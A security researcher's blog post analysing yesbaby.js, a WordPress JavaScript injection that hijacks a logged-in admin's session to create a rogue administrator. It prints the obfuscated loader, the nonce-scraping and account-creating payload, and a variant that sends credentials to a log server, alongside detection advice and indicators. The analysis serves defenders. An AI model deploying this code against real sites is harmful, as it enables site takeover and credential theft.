---
title: yesbaby.js - Using Your Own Admin Session to Create a Rogue Admin
url: https://lukeleal.com/research/posts/yesbaby-js-wp-admin-creator/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:23.212513
---

# yesbaby.js - Using Your Own Admin Session to Create a Rogue Admin

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [yesbaby.js - Using Your Own Admin Session to Create a Rogue Admin](https://lukeleal.com/research/posts/yesbaby-js-wp-admin-creator/)

2023-07-23Luke

#[yesbaby.js](https://lukeleal.com/research/tags/yesbaby.js/)
#[user-new.php](https://lukeleal.com/research/tags/user-new.php/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[JavaScript](https://lukeleal.com/research/tags/javascript/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![yesbaby.js - Using Your Own Admin Session to Create a Rogue Admin](https://lukeleal.com/research/yesbaby-cover-q90.jpg "Cover Image")

## Table of Contents

* [The Loader](#the-loader)
* [yesbaby.js](#yesbabyjs)
* [Variant 2: Random Passwords & a Log Server](#variant-2-random-passwords--a-log-server)
* [Detection](#detection)
* [IOCs](#iocs)
* [Sample](#sample)

Most JavaScript injections on WordPress sites go after regular visitors with redirects, spam, or skimmers. **yesbaby.js** does the opposite: it ignores normal visitors and waits for the *site administrator*.

> When an admin who is logged in loads an infected page, the script uses **their** session to create a new administrator account for the attacker.

There’s no brute forcing or stolen credentials. The admin’s own browser does all of the work.

## The Loader[#](#the-loader)

The injection itself is small and is placed into theme files or database content. It hides the URL of the remote script with `String.fromCharCode`:

```
<script>var sc = document.createElement(String.fromCharCode(115, 99, 114, 105, 112, 116)); sc.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 104, 105, 108, 108, 103, 114, 111, 117, 112, 105, 110, 99, 46, 99, 111, 109, 47, 119, 112, 45, 105, 110, 99, 108, 117, 100, 101, 115, 47, 106, 115, 47, 121, 101, 115, 98, 97, 98, 121, 46, 106, 115); sc.type = String.fromCharCode(116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116); document.getElementsByTagName(String.fromCharCode(104, 101, 97, 100))[0].appendChild(sc);</script>
```

Decoded, it just appends a `<script>` tag to the `<head>`:

```
var sc = document.createElement("script");
sc.src = "hxxp://hillgroupinc[.]com/wp-includes/js/yesbaby.js";
sc.type = "text/javascript";
document.getElementsByTagName("head")[0].appendChild(sc);
```

The `yesbaby.js` payload is hosted on *other compromised websites*, not on attacker infrastructure. That means a hacked site in one campaign becomes the payload host for the next. These are the hosting paths I observed:

* `hillgroupinc[.]com/wp-includes/js/yesbaby.js`
* `www[.]studio-lazienek[.]pl/plugins/user/yesbaby.js`

The same loader template, character for character, was also used to load third-party spam and redirect scripts such as `jackielovedogs[.]com/zone.js` and `css[.]digestcolect[.]com/zbt`. The injection is just a delivery system. Whatever the attacker points `sc.src` at is what runs.

## yesbaby.js[#](#yesbabyjs)

The payload requests `/wp-admin/user-new.php` with jQuery. A logged-out visitor just gets redirected to the login page, so nothing happens. For a logged-in administrator, though, the response is the **Add New User** form, and that form includes a valid CSRF nonce:

```
var domain = location.protocol + '//' + document.domain;
var url = domain + '/wp-admin/user-new.php';
var JQ = jQuery.noConflict();
JQ.ajax({
  "url": url,
  "success": function(x) {
    var re = /name="_wpnonce_create-user"(\s+)value="([^"]+)"/g;
    var m = re.exec(x);
    if (m[2].match(/([a-z0-9]{10})/)) {
      var nonce = m[2];
    }
```

Next, the script scrapes `_wpnonce_create-user` from the HTML and immediately POSTs the form back with the stolen nonce, which creates a user with the `administrator` role:

```
    JQ.ajax({
      "url": url,
      "method": "POST",
      "data":
      {
        "action": "createuser",
        "_wpnonce_create-user": nonce,
        "_wp_http_referer": "/wp-admin/user-new.php",
        "user_login": "echoll",
        "email": "[email protected]",
        "first_name": "loli",
        "last_name": "loli",
        "url": "hxxps://google[.]com/",
        "pass1": "sikerim1213",
        "pass1-text": "sikerim1213",
        "pass2": "sikerim1213",
        "send_user_notification": 0,
        "role": "administrator",
        "createuser": "Add+New+User"
      },
```

The request comes from the admin’s browser with the admin’s cookies and a valid nonce. To WordPress, it looks exactly like the admin filling out the form by hand. Setting `send_user_notification` to `0` makes sure no welcome email goes out.

The attacker didn’t even bother removing the debug logging:

```
console.log('Registering, User: echoll, Pass: sikerim1213, Role: Admin ');
```

## Variant 2: Random Passwords & a Log Server[#](#variant-2-random-passwords--a-log-server)

A later version of the script, still built on the same `user-new.php` nonce trick, was rewritten to use `fetch` instead of jQuery. This version adds two improvements for the attacker:

1. A **random 8 character password** is generated for each victim site, so no password is hardcoded to search for.
2. Because the attacker can no longer know the password ahead of time, the new credentials are **sent to a log server** at `wpemojii[.]com`, a domain picked to look like WordPress’s own `wp-emoji` script.

```
function createUserAndSendLog() {
    const trigger = window.location.origin + "/wp-admin/user-new.php";
    const logUrl = 'hxxps://wpemojii[.]com/az.php';
    httpGet(trigger).then(page => {
        const regExp = /name="_wpnonce_create-user"\svalue="([^)]+)"/;
        const matches = regExp.exec(page);
        if (matches && matches[1]) {
            const csrftoken = matches[1].slice(0, 10);
            const randomPassword = generateRandomPassword(8);
            httpPost(trigger, csrftoken, randomPassword).then(postResponse => {
                if (postResponse) {
                    const logText = `
                    User created:
                    Username: wpx
                    Email: [email protected]
                    ...
                    URL: ${window.location.origin}
                    Password: ${randomPassword}
                    `;
                    sendLog(logUrl, logText);
```

The error strings are in Turkish (`Log gönderme başarısız` = “Log sending failed”, `Log gönderildi` = “Log sent”), and the first variant’s password `sikerim` is Turkish profanity.

## Detection[#](#detection)

* Look for administrator accounts you didn’t create, especially `echoll` or `wpx`, or the emails `[[email protected]](/cdn-cgi/l/email-protection)` and `[[email protected]](/cdn-cgi/l/email-protection)`.
* Search theme files and the database (`wp_posts`, `wp_options`) for `String.fromCharCode(115, 99, 114, 105, 112, 116)`, which decodes to `script`.
* Because this injection waits for an admin, the attacker’s new account often shows up *days* after the original compromise. Removing the injection without auditing the user list leaves the attacker with a working login.

## IOCs[#](#iocs)

```
hillgroupinc[.]com/wp-includes/js/yesbaby.js
www[.]studio-lazienek[.]pl/plugins/user/yesbaby.js
wpemojii[.]com/az.php
echoll ...